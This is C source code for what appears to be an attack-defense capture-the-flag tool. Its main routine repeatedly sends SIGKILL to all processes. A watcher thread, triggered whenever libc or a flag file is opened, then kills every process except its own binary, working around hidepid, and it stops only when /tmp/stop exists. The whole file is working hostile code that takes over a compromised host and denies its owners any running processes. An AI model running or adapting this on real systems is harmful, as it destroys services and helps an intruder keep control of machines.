# define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <sys/inotify.h>

#include "global_var.h"

int ifd;
int proc_offset = 0;
int hidepid = 0;
char inotify_buf[BUF_LEN];

struct linux_dirent {
  long            d_ino;
  off_t           d_off;
  unsigned short  d_reclen;
  char            d_name[];
};

int fd;
char dir_buf[BUF_SIZE];
long my_pid;
int pwn_len;

void open_proc_dir() {
   
  long bpos, proc;
  long pid_threshold = -1;
  struct linux_dirent *dp;
  
  pwn_len = strlen(PWN_NAME);



  if((fd = syscall(_NR_open, PATH, O_RDONLY|O_DIRECTORY)) < 0){
    printf("opendir[%s] error: %m\n", PATH);
    exit(0);
  }

  int nread = syscall(_NR_getdents, fd, dir_buf, BUF_SIZE);
  if(nread == -1){
    printf("getdents error: %m\n");
    exit(0);
  }
  
  if(nread > 24*80)
    pid_threshold = 299;

  my_pid = getpid();
  int rev_off;
  for(bpos = 0; bpos < nread;){
    dp = (struct linux_dirent*)(bpos + dir_buf);
    
    // if(isdigit(dp->d_name[0])){
    if(hidepid){
      if(memcmp(dp->d_name, "thread-self", 11) == 0)
        break;
    }
    else{
      if(isdigit(dp->d_name[0])){
        if(pid_threshold < 0)  
          break; 
        else{
          if(strtol(dp->d_name, NULL, 10) >pid_threshold){
            proc_offset = rev_off;            
            break;
          }
        }
      }     
    }
    bpos += dp->d_reclen;
    rev_off = proc_offset;
    proc_offset = dp->d_off; 
  }
  syscall(_NR_lseek, fd, proc_offset, 0);
}

void do_check_proc() {
  struct linux_dirent *dp = NULL;

  long nread, pid, bpos;
  char p[MAX_PATH_LEN] = {0};

  nread = syscall(_NR_getdents, fd, dir_buf, BUF_SIZE);
  if(nread == -1) return;

  dp = (struct linux_dirent*)dir_buf;
  for(bpos = dp->d_reclen; bpos < nread;){
    dp = (struct linux_dirent*)(bpos + dir_buf);
    bpos += dp->d_reclen;

    pid = strtol(dp->d_name, NULL, 10);
    if(pid == my_pid)
      continue;
    //readlink /proc/pid/exe
    *(unsigned long long*)(dp->d_name+strlen(dp->d_name)) = 0x6578652f;
    int pathlen = syscall(_NR_readlink, dp->d_name, p, MAX_PATH_LEN - 1);
    if(pathlen != pwn_len) 
      goto kill_pid;
    if(memcmp(p, PWN_NAME, pwn_len)) 
      goto kill_pid;
    continue;
kill_pid:
    syscall(_NR_kill, pid, 9);
  }
  syscall(_NR_lseek, fd, proc_offset, 0);
}


void inotify_monitor() {

  int hfd, ret;
  
  hfd = open("/proc/self/mountinfo", O_RDONLY);
  if(hfd < 0){
    printf("open /proc/self/mountinfo error\n");
    exit(1);
  }
  do{
    ret = read(hfd, inotify_buf, BUF_SIZE - 1);
    if(strstr(inotify_buf, "hidepid=2")){
      hidepid = 1;
      break;
    }
  }while(ret > 0);
  close(hfd);
  
  
  printf("hidepid %d\n", hidepid);
  
  syscall(_NR_chdir, PATH);
  open_proc_dir();

  ifd = inotify_init();

  inotify_add_watch(ifd, LIBC_PATH, IN_OPEN);
  inotify_add_watch(ifd, FLAG_FILE_PATH, IN_OPEN);

  while (1) {
    read(ifd, inotify_buf, BUF_LEN);
    do_check_proc();
  }
}

void check_stop(){
  int ret;
  ret = access("/tmp/stop", F_OK);
  if(ret == 0)
    syscall(_NR_kill, 0, 9);
}

void sigalarm_handler(int sig) {
  check_stop();
  set_timer();
}

void main(){
  int i;
  for(i=0; i < 10; i++)
  syscall(_NR_kill, -1, 9);
  
  void* inotify_stack = malloc(0x20000);
  pid_t  ret = clone(inotify_monitor, inotify_stack+0x20000, CLONE_SIGHAND | CLONE_VM | CLONE_THREAD | CLONE_FILES | CLONE_FS, 0);

  signal(SIGALRM, sigalarm_handler);

  set_timer();
  while(1) sleep(-1);
}
